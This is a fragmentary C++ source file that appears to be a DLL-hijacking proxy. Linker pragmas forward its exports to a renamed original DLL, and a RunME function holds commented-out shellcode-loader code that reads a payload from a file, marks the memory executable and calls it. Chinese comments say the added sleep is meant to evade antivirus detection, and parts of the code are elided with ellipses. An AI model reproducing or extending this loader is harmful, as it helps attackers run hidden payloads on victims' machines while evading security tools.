...
DWORD WINAPI	RunME(void) {
	...
	return 0;
#pragma region MyRegion
	//DWORD dwRead; DWORD threadID;
	//PVOID now_exec = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//ReadFile(hFile, now_exec, dwSize, &dwRead, 0);
	//CloseHandle(hFile);
	//DWORD	old;
	//VirtualProtect(now_exec, dwSize, PAGE_EXECUTE, &old); Sleep(2000); //延迟2S，躲避杀软查杀
	//
	//if (strword != base64buf)
	//	strword = base64_encode(base64buf.c_str(), base64buf.length());
	//else
	...
	//return 0;
	//DWORD dwRead;
	//auto callShellcode = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//ReadFile(hFile, callShellcode, dwSize, &dwRead, 0);
	//DWORD	old;
	//VirtualProtect(callShellcode, dwSize, PAGE_EXECUTE, &old); Sleep(2000); //延迟2S，躲避杀软查杀
	////CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RunShellcode, 0, 0, 0);
	//MessageBoxA(0, 0, 0, 0);
	//((void(*)())callShellcode)();
	//if (strword != base64buf)
	//	strword = base64_encode(base64buf.c_str(), base64buf.length());
...
// 导出函数
#pragma comment(linker, "/EXPORT:d2ld=ldconvert1.d2ld,@1")
#pragma comment(linker, "/EXPORT:ld2d=ldconvert1.ld2d,@2")
#pragma comment(linker, "/EXPORT:ld2str=ldconvert1.ld2str,@3")
#pragma comment(linker, "/EXPORT:str2ld=ldconvert1.str2ld,@4")
